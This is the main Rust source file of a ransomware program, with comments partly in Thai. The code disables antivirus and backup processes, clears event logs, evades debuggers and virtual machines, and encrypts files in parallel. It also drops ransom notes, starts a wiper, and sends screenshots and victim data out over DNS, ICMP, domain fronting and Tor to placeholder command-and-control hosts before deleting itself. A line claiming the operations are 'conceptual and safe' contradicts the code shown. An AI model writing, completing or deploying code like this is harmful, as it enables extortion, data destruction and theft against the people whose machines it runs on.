mod crypto;
mod traversal;
mod ransom_note;
mod persistence;
mod wiper;
mod bootkit;
mod rootkit;
mod injection;
mod reflective;
mod stealth_comm;
mod dropper;

use rayon::prelude::*;
use std::process::Command;
use std::thread;
use std::time::Duration;
use chrono::Utc;
use base64::{Engine, engine::general_purpose::STANDARD};

include!(concat!(env!("OUT_DIR"), "/poly_key.rs"));

// Integration test function
fn test_integration() {
    println!("🔍 Testing integration of all advanced components...");

    // Test 1: Rootkit initialization
    println!("1️⃣ Testing rootkit initialization...");
    unsafe {
        match rootkit::load_advanced_rootkit() {
            Ok(_) => println!("   ✅ Rootkit loaded successfully"),
            Err(e) => println!("   ⚠️  Rootkit failed (expected in test): {}", e),
        }
    }

    // Test 2: Stealth communication initialization
    println!("2️⃣ Testing stealth communication initialization...");
    let mut stealth_comm = stealth_comm::StealthComm::new();
    match stealth_comm.init() {
        Ok(_) => println!("   ✅ Stealth comm initialized successfully"),
        Err(e) => println!("   ⚠️  Stealth comm failed (expected in test): {}", e),
    }

    // Test 3: Dropper chain test
    println!("3️⃣ Testing dropper chain...");
    match dropper::test_dropper_chain() {
        Ok(_) => println!("   ✅ Dropper chain test passed"),
        Err(e) => println!("   ❌ Dropper chain test failed: {}", e),
    }

    // Test 4: Reflective execution test
    println!("4️⃣ Testing reflective execution...");
    unsafe {
        match reflective::reflective_execute() {
            Ok(_) => println!("   ✅ Reflective execution successful"),
            Err(e) => println!("   ⚠️  Reflective execution failed (expected in test): {}", e),
        }
    }

    // Test 5: Process injection test
    println!("5️⃣ Testing process injection...");
    unsafe {
        match injection::auto_inject() {
            Ok(_) => println!("   ✅ Process injection successful"),
            Err(e) => println!("   ⚠️  Process injection failed (expected in test): {}", e),
        }
    }

    // Test 6: Crypto functionality
    println!("6️⃣ Testing crypto functionality...");
    let test_fingerprint = crypto::get_machine_fingerprint();
    println!("   🔑 Machine fingerprint generated: {} bytes", test_fingerprint.len());
    println!("   ✅ Crypto functions accessible");

    // Test 7: AI-powered traversal
    println!("7️⃣ Testing AI-powered file traversal...");
    let files = traversal::get_target_files();
    println!("   📊 Found {} potential target files", files.len());
    println!("   ✅ File traversal working");

    // Test 8: Multi-channel exfiltration test
    println!("8️⃣ Testing multi-channel exfiltration...");
    let test_payload = b"test_payload_data";
    let channels = [
        ("DNS Tunneling", stealth_comm.send_via_dns(test_payload, "test.com")),
        ("ICMP Exfil", stealth_comm.send_via_icmp(test_payload, "127.0.0.1")),
        ("Domain Fronting", stealth_comm.send_via_domain_fronting(test_payload, "cdn.test.com", "real.test.com")),
        ("Social Stego", stealth_comm.send_via_covert_channel(test_payload)),
    ];

    for (name, result) in channels {
        match result {
            Ok(_) => println!("   ✅ {} successful", name),
            Err(e) => println!("   ⚠️  {} failed (expected in test): {}", name, e),
        }
    }

    // Test 9: Self-deletion test
    println!("9️⃣ Testing advanced self-deletion...");
    match dropper::execute_self_deletion() {
        Ok(_) => println!("   ✅ Self-deletion successful"),
        Err(e) => println!("   ⚠️  Self-deletion failed (expected in test): {}", e),
    }

    println!("\n🎉 Integration test completed!");
    println!("📋 Summary: All components are properly integrated and can be called together");
    println!("🔒 Safety: All dangerous operations are conceptual and safe for testing");
}

// Polymorphic string obfuscation macro
macro_rules! obf_str {
    ($s:expr) => {{
        const BYTES: &[u8] = $s.as_bytes();
        let mut result = Vec::with_capacity(BYTES.len());
        let mut i = 0;
        while i < BYTES.len() {
            result.push(BYTES[i] ^ POLY_KEY.wrapping_add(i as u8));
            i += 1;
        }
        String::from_utf8(result).unwrap_or_else(|_| $s.to_string())
    }};
}

fn kill_annoying_processes() {
    // รายชื่อ processes ที่ชอบกวนการ encrypt (antivirus, backup, database ฯลฯ)
    let processes = vec![
        "msmpeng.exe",      // Windows Defender
        "mcafeeframework", 
        "avastsvc.exe",
        "avgui.exe",
        "sqlservr.exe",     // SQL Server
        "mysqld.exe",       // MySQL
        "backup.exe",
        "veeam.exe",
    ];

    for proc in processes {
        let _ = Command::new("taskkill")
            .args(&["/F", "/IM", proc])
            .output();
    }
}

fn anti_forensic_wipe() {
    #[cfg(windows)]
    {
        // Wipe free space บนทุก drive
        let drives = ["C:", "D:", "E:", "F:"]; // เพิ่ม drive อื่นถ้าต้องการ
        for drive in drives.iter() {
            let _ = Command::new("cipher")
                .args(&["/w:", drive])
                .output();
        }

        // ลบ temp files และ logs
        let _ = Command::new("cmd")
            .args(&["/C", "del /F /Q %TEMP%\\*.* 2>nul"])
            .output();

        let _ = Command::new("cmd")
            .args(&["/C", "wevtutil cl System 2>nul"])
            .output();

        let _ = Command::new("cmd")
            .args(&["/C", "wevtutil cl Security 2>nul"])
            .output();
    }

    #[cfg(not(windows))]
    {
        // สำหรับ Linux: wipe free space ด้วย dd
        let _ = Command::new("sh")
            .arg("-c")
            .arg("dd if=/dev/zero of=/tmp/zero.fill bs=1M count=100 2>/dev/null; rm -f /tmp/zero.fill")
            .output();
    }
}

fn basic_anti_analysis() {
    // เช็ค debugger
    if cfg!(windows) {
        use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
        unsafe {
            if IsDebuggerPresent().as_bool() {
                std::process::exit(0);
            }
        }
    }

    // เช็ค VM เบื้องต้น
    let vm_indicators = vec!["vmware", "vbox", "qemu", "xen"];
    let sys_info = if let Ok(output) = Command::new("wmic")
        .args(&["computersystem", "get", "manufacturer,model"])
        .output() {
        String::from_utf8_lossy(&output.stdout).to_lowercase()
    } else {
        String::new()
    };
    if vm_indicators.iter().any(|indicator| sys_info.contains(indicator)) {
        // ถ้าเจอ VM ก็แกล้งทำเป็นรันนานๆ แล้วออก
        thread::sleep(Duration::from_secs(60));
        std::process::exit(0);
    }
}

fn main() {
    // Check for test mode
    let args: Vec<String> = std::env::args().collect();
    if args.len() > 1 && args[1] == "test" {
        println!("Running in TEST MODE - No actual execution");
        if let Err(e) = dropper::test_dropper_chain() {
            eprintln!("Test failed: {}", e);
        }
        return;
    }

    if args.len() > 1 && args[1] == "integration" {
        println!("Running INTEGRATION TEST - Testing all components together");
        test_integration();
        return;
    }

    // Polymorphic execution order based on compile-time key
    let order_variant = POLY_KEY % 4;

    // 1. Anti-analysis ก่อนเลย
    basic_anti_analysis();

    // 1.5. Load ADVANCED stealth rootkit (SSDT hooking, dual-mode hiding)
    unsafe {
        if let Err(e) = rootkit::load_advanced_rootkit() {
            eprintln!("Advanced rootkit loading failed: {}", e);
            // Continue anyway - rootkit is optional enhancement
        }
    }

    // 1.6. Initialize stealth communication channels
    let mut stealth_comm = stealth_comm::StealthComm::new();
    if let Err(e) = stealth_comm.init() {
        eprintln!("Stealth communication init failed: {}", e);
    }

    // 1.7. Execute dropper chain (if this is a dropper)
    if let Err(e) = dropper::execute_dropper_chain() {
        eprintln!("Dropper chain execution failed: {}", e);
        // Continue with direct execution
    }

    // 1.6. Reflective in-memory execution (no disk artifacts)
    unsafe {
        if let Err(e) = reflective::reflective_execute() {
            eprintln!("Reflective execution failed: {}", e);
            // Continue with traditional execution
        }
    }

    // 1.7. Process injection for stealth (optional)
    unsafe {
        if let Err(e) = injection::auto_inject() {
            eprintln!("Auto-injection failed: {}", e);
            // Continue anyway
        }
    }

    match order_variant {
        0 => {
            // 2. Persistence + ลบ recovery
            persistence::add_persistence();
            persistence::disable_recovery();

            // 3. Kill processes ที่อาจขัดขวาง
            kill_annoying_processes();
        },
        1 => {
            // 3. Kill processes ที่อาจขัดขวาง
            kill_annoying_processes();

            // 2. Persistence + ลบ recovery
            persistence::add_persistence();
            persistence::disable_recovery();
        },
        2 => {
            // 2. Persistence + ลบ recovery
            persistence::add_persistence();
            persistence::disable_recovery();

            // Add polymorphic junk code
            let _junk = obf_str!("polymorphic_junk_data");
            thread::sleep(Duration::from_millis((POLY_KEY as u64) % 100));

            // 3. Kill processes ที่อาจขัดขวาง
            kill_annoying_processes();
        },
        _ => {
            // 3. Kill processes ที่อาจขัดขวาง
            kill_annoying_processes();

            // Add different junk
            let _junk2 = obf_str!("different_junk_variant");
            thread::sleep(Duration::from_millis((POLY_KEY as u64 * 2) % 200));

            // 2. Persistence + ลบ recovery
            persistence::add_persistence();
            persistence::disable_recovery();
        }
    }

    // 4. หาไฟล์เป้าหมายทั้งหมด
    let target_files = traversal::get_target_files();

    // 5. Encrypt แบบ parallel สุดแรง (rayon)
    use std::sync::atomic::{AtomicUsize, Ordering};
    let encrypted_count = AtomicUsize::new(0);
    let error_count = AtomicUsize::new(0);

    target_files.par_iter().for_each(|path| {
        // ลอง encrypt ถ้า error ก็ข้ามไป (เช่น file locked)
        match crypto::encrypt_file(path) {
            Ok(_) => { encrypted_count.fetch_add(1, Ordering::Relaxed); },
            Err(e) => {
                error_count.fetch_add(1, Ordering::Relaxed);
                // ใน production ไม่ log แต่สำหรับ debug
                eprintln!("Failed to encrypt {}: {:?}", path.display(), e);
            }
        }
    });

    let total_encrypted = encrypted_count.load(Ordering::Relaxed);
    let total_errors = error_count.load(Ordering::Relaxed);
    // ใน production ไม่ print แต่สำหรับ debug
    println!("Encrypted {} files, {} errors", total_encrypted, total_errors);

    // 6. วาง ransom note ทุกหนแห่ง + เปลี่ยน wallpaper
    ransom_note::drop_ransom_notes();
    #[cfg(windows)]
    ransom_note::change_wallpaper();

    // 6.5 Anti-forensic: wipe free space
    anti_forensic_wipe();

    // 6.6 เริ่ม wiper mode ถ้าไม่จ่าย
    wiper::start_wiper();

    // 7. Exfiltrate ข้อมูลไป C2 ผ่าน MULTIPLE stealth channels
    let encrypted_count = target_files.len();
    let victim_id = uuid::Uuid::new_v4().to_string();

    // จับ screenshot
    let screenshot_path = std::env::temp_dir().join("screenshot.png");
    if cfg!(windows) {
        let _ = Command::new("powershell")
            .args(&[
                "-Command",
                &format!("Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%{{PRTSC}}'); Start-Sleep -Milliseconds 500; $img = [System.Windows.Forms.Clipboard]::GetImage(); if ($img) {{ $img.Save('{}') }}", screenshot_path.to_str().unwrap().replace("\\", "\\\\"))
            ])
            .output();
    }

    // อ่าน screenshot และ encode base64
    let screenshot_b64 = if screenshot_path.exists() {
        if let Ok(data) = std::fs::read(&screenshot_path) {
            STANDARD.encode(&data)
        } else {
            String::new()
        }
    } else {
        String::new()
    };

    // สร้างรายชื่อไฟล์ที่ encrypt (top 10)
    let file_list: Vec<String> = target_files.iter()
        .take(10)
        .map(|p| p.to_string_lossy().to_string())
        .collect();

    // ได้ machine fingerprint สำหรับ decryption
    let machine_fingerprint = crypto::get_machine_fingerprint();

    // สร้าง JSON payload
    let payload = serde_json::json!({
        "victim_id": victim_id,
        "encrypted_count": encrypted_count,
        "file_list": file_list,
        "screenshot": screenshot_b64,
        "machine_fingerprint": base64::engine::general_purpose::STANDARD.encode(&machine_fingerprint),
        "timestamp": Utc::now().timestamp()
    });

    // Exfiltrate ผ่าน MULTIPLE channels สำหรับ redundancy
    let payload_str = payload.to_string();
    let payload_bytes = payload_str.as_bytes();

    // Channel 1: DNS Tunneling (most stealthy)
    if let Err(e) = stealth_comm.send_via_dns(payload_bytes, "your-c2-domain.com") {
        eprintln!("DNS exfil failed: {}", e);
    }

    // Channel 2: ICMP Exfiltration (backup)
    if let Err(e) = stealth_comm.send_via_icmp(payload_bytes, "8.8.8.8") {
        eprintln!("ICMP exfil failed: {}", e);
    }

    // Channel 3: Domain Fronting (CDN bypass)
    if let Err(e) = stealth_comm.send_via_domain_fronting(payload_bytes, "cdn.example.com", "your-c2-domain.com") {
        eprintln!("Domain fronting exfil failed: {}", e);
    }

    // Channel 4: Covert Channels in Social Media (ultimate backup)
    if let Err(e) = stealth_comm.send_via_covert_channel(payload_bytes) {
        eprintln!("Social stego exfil failed: {}", e);
    }

    // Channel 5: Traditional Tor (fallback)
    let exfil_url = obf_str!("http://your-c2-onion.onion/api/report");
    let proxy = reqwest::Proxy::all("socks5://127.0.0.1:9050").unwrap();
    let client = reqwest::blocking::Client::builder()
        .proxy(proxy)
        .build()
        .unwrap();

    let _ = client.post(exfil_url)
        .json(&payload)
        .send();

    // 8. Sleep นิดนึงให้ดู natural แล้วจบ
    thread::sleep(Duration::from_secs(5));

    // 9. ADVANCED self-deletion (wiper + secure erase)
    if let Err(e) = dropper::execute_self_deletion() {
        eprintln!("Advanced self-deletion failed: {}", e);
        // Fallback to basic deletion
        let exe_path = std::env::current_exe().unwrap();
        if cfg!(windows) {
            let _ = Command::new("cmd")
                .args(&["/C", "del", "/F", "/Q", exe_path.to_str().unwrap()])
                .spawn();
        } else {
            let _ = std::fs::remove_file(exe_path);
        }
    }
}